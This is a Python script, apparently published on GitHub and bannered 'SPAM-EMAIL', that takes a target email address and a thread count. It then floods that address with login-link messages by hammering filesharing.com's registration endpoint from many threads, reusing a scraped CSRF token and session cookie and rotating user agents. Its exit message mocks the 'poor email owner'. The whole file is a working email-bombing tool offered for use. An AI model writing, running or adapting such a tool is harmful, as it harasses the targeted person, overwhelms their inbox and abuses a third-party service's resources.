import threading,signal,time
from requests import Session
from user_agent import generate_user_agent
from urllib.parse import unquote 
from requests.adapters import HTTPAdapter
filza2=print


print("""
███████╗██████╗  █████╗ ███╗   ███╗      ███████╗███╗   ███╗ █████╗ ██╗██╗     
██╔════╝██╔══██╗██╔══██╗████╗ ████║      ██╔════╝████╗ ████║██╔══██╗██║██║     
███████╗██████╔╝███████║██╔████╔██║█████╗█████╗  ██╔████╔██║███████║██║██║     
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║╚════╝██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     
███████║██║     ██║  ██║██║ ╚═╝ ██║      ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝      ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
                                                                
                            By github.com/filza2                               
""")
email=input('- The Email : ')
Thread=int(input('- Thread : ')) #Phone from 10 to 80 || PC/computer from 100 to 400(you can do more it really depending on what machine you have) 
s=Session();adapter=HTTPAdapter(pool_connections=200,pool_maxsize=200);s.mount('http://',adapter);s.mount('https://',adapter);r1=s.get('https://www.filesharing.com/register',headers={'Host': 'www.filesharing.com','User-Agent': generate_user_agent(),'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate, br','Upgrade-Insecure-Requests': '1','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'none','Sec-Fetch-User': '?1','Priority': 'u=0, i','Te': 'trailers','Connection': 'keep-alive'});csrf_token=unquote(r1.cookies.get("XSRF-TOKEN"));filesharingcom_session=r1.cookies.get("filesharingcom_session")
print("- - - - - - Started - - - - - -")


stop_flag=threading.Event()
def handle_sigint(signum,frame):
    filza2('- poor email owner i fell sorry for him now, any ways thanks for using the tool')
    stop_flag.set()
signal.signal(signal.SIGINT,handle_sigint)
def Spam_Email(csrf_token,filesharingcom_session):  
    try: 
        while not stop_flag.is_set(): 
            r=s.post("https://www.filesharing.com/register",
                   headers={
                       'Host': 'www.filesharing.com',
                       'Cookie': f'filesharingcom_session={filesharingcom_session}',
                       'User-Agent': generate_user_agent(),
                       'Accept': 'text/html, application/xhtml+xml',
                       'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
                       'Accept-Encoding': 'gzip, deflate, br',
                       'Content-Type': 'application/json',
                       'X-Requested-With': 'XMLHttpRequest',
                       'X-Inertia': 'true',
                       'X-Inertia-Version': '03d5a27941309543615fd158b5ed084a',
                       'X-Xsrf-Token': f"{csrf_token}",
                       'Origin': 'https://www.filesharing.com',
                       'Referer': 'https://www.filesharing.com/login',
                       'Sec-Fetch-Dest': 'empty',
                       'Sec-Fetch-Mode': 'cors',
                       'Sec-Fetch-Site': 'same-origin',
                       'Priority': 'u=0',
                       'Te': 'trailers',
                       'Connection': 'keep-alive'},
                   json={
                       "email": email,
                       "isDirty": False,
                       "errors": {},
                       "hasErrors": False,
                       "processing": False,
                       "progress": None,
                       "wasSuccessful": False,
                       "recentlySuccessful": False,
                       "__rememberable": True})
            if 'We have sent you an email with a link to login.' in r.text:print(f'- Sent ')
            else:print(f'- Error Send ')
            time.sleep(0.1)
            
    except Exception as e:pass;filza2(f'- Error : {e}')




    
threads=[]
for FZ in range(Thread):
    t=threading.Thread(target=Spam_Email,args=(csrf_token,filesharingcom_session))
    t.daemon=True  
    t.start()
    threads.append(t)
    
try:
    while not stop_flag.is_set():time.sleep(0.1)
except KeyboardInterrupt:stop_flag.set()

